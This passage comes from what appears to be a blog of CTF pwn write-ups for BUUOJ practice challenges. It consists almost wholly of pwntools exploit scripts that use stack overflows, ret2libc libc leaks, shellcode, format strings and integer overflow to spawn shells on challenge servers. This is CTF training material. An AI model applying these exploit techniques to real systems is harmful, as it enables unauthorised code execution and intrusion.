class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28714</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn21"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">vuln = <span class="number">0x400636</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">ret = <span class="number">0x4004d1</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) </span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">read = uu64(ru(<span class="string">"What's"</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>,read)</span><br><span class="line">libc_base = read - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28640</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn22"</span>)</span><br><span class="line">ru(<span class="string">"Yippie, lets crash: "</span>)</span><br><span class="line">stack = int(ru(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(stack)</span></span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">"crashme\x00"</span>  + <span class="string">b'A'</span>*(<span class="number">0x16</span><span class="number">-8</span>+<span class="number">4</span>) + p32(stack<span class="number">-0x1c</span>) + shellcode</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><p>简单write泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.3")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.231.so"</span>)</span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">write_plt = elf.sym[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line">ru(<span class="string">"Input:\n"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc_base = write - libc.sym[<span class="string">"write"</span>]</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">sh = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line">ru(<span class="string">"Input:\n"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><p>fmt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.4"</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25708</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.4")</span></span><br><span class="line">x = <span class="number">0x0804A02C</span></span><br><span class="line">pld = fmtstr_payload(<span class="number">11</span>,&#123;x:<span class="number">4</span>&#125;)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><p>简单调一下 发现ida里面偏移是错误的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25781</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.3")</span></span><br><span class="line">back = <span class="number">0x0400620</span></span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x88</span>)+p64(back)</span><br><span class="line">ru(<span class="string">"Input your message:\n"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p>普通32位write泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28988</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.3")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.6"</span>)</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">write_plt = elf.sym[<span class="string">"write"</span>]</span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.231.so"</span>)</span><br><span class="line">libc_base = write-libc.sym[<span class="string">"write"</span>]</span><br><span class="line">sys = libc_base+libc.sym[<span class="string">"system"</span>]</span><br><span class="line">sh = libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(sys)+p32(<span class="number">0</span>)+p32(sh)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><p>整数溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29933</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.3")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.6"</span>)</span><br><span class="line">back = <span class="number">0x400726</span></span><br><span class="line">ru(<span class="string">"[+]Please input the length of your name:\n"</span>)</span><br><span class="line">sl(<span class="string">"2415919104"</span>)</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x10</span>+<span class="number">0x08</span>)+p64(back)</span><br><span class="line">print(r())</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><p>64位write泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26477</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.8",env =&#123;"LD_PRELOAD":"./libc-2.232.so"&#125;)</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">pop_rsi_pop_r15 = <span class="number">0x00000000004006b1</span></span><br><span class="line">ret = <span class="number">0x0000000000400499</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.8"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.232.so")</span></span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">main = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_pop_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line">ru(<span class="string">"Input:\n"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">write = uu64(r(<span class="number">6</span>))</span><br><span class="line"><span class="comment"># libc_base = write - libc.sym["write"]</span></span><br><span class="line"><span class="comment"># leak("libc",libc_base)</span></span><br><span class="line"><span class="comment"># sys = libc_base + libc.sym["system"]</span></span><br><span class="line"><span class="comment"># sh = libc_base + next(libc.search("/bin/sh"))</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">ru(<span class="string">"Input:\n"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h2><p>字节存储问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn3.9")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25351</span>)</span><br><span class="line">win1 = <span class="number">0x080485CB</span></span><br><span class="line">win2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)+p32(win1)+p32(win2)+p32(flag)+<span class="string">b"\xAD\xAA\xAA\xBA"</span>+<span class="string">b"\xAD\xBA\xAD\xDE"</span></span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h2><blockquote><p>不知道是什么问题，只有交互输出才可以</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = process("./pwn3.11")</span></span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.232.so")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28866</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3.12"</span>)</span><br><span class="line">cat = <span class="number">0x080487E0</span></span><br><span class="line">sys = <span class="number">0x08048440</span></span><br><span class="line">sys_addr=elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">pld = <span class="string">b'A'</span>*<span 